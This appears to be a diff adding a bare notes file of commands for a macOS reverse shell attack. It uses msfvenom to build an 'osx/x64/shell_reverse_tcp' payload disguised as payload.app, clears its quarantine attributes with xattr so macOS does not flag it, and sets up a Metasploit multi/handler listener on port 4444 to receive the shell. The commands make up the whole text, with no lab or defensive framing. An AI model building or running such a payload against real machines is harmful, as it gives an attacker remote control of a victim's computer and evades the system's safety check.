@@ -1,0 +1,12 @@
+msfvenom -p osx/x64/shell_reverse_tcp LHOST={my ip} LPORT=4444 > payload.app
+xattr -cr payload.app
+chmod +x payload.app
+
+
+msfconsole
+use exploit/multi/handler
+set PAYLOAD osx/x64/shell_reverse_tcp
+set LHOST {my ip}
+set LPORT 4444
+run -j
+sessions
